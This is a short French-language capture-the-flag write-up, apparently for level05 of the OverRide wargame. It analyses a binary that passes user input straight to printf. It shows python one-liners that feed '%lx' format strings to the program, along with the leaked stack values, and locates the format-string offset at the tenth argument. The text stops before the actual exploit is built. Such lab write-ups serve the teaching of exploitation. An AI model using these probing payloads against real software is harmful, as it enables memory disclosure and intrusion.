Comme on peut le voir pas d'appel à system ou "/bin/sh" donc on va peut etre devoir faire un overflow ? Malheuresement ça me semble un peut complexe du a la sécurité du fgtes a 100. Il nous reste le printf pas sécurisé mais rien a cherché dedans j'ai déja fait print "%lx " * 100 mais rien . 


On voit dans le code que le on a une allocation memoire de 100 sur notre variable buffer mais qui est proteger par fgets a hauteur de l'allocation memoire de notre buffer. On ne peut donc pas overflow. Or on observe une faille dans printf car pas de securite sur la taille du buffer ou d'affichage :

printf(buffer); au lieu de printf("%s",buffer);

Donc on peut affecter l'affichage et autre. Exemple :

python -c 'print "A" * 20' | ./level05
aaaaaaaaaaaaaaaaaaaa

Ok maintenant on essaie d'afficher la memoire :

python -c 'print "%lx " * 20' | ./level05 
64 f7fcfac0 f7ec3add ffffd6df ffffd6de 0 ffffffff ffffd764 f7fdb000 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25


Maintenant on essayer les 2 :

level05@OverRide:~$ python -c 'print "AAAA" + "%lx " * 20' | ./level05 
aaaa64 f7fcfac0 f7ec3add ffffd6df ffffd6de 0 ffffffff ffffd764 f7fdb000 61616161 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25 20786c25

On observe 61616161 qui est notre AAAA notre offset est donc au 10 emplacement on va pouvoir agir potentiellement par ici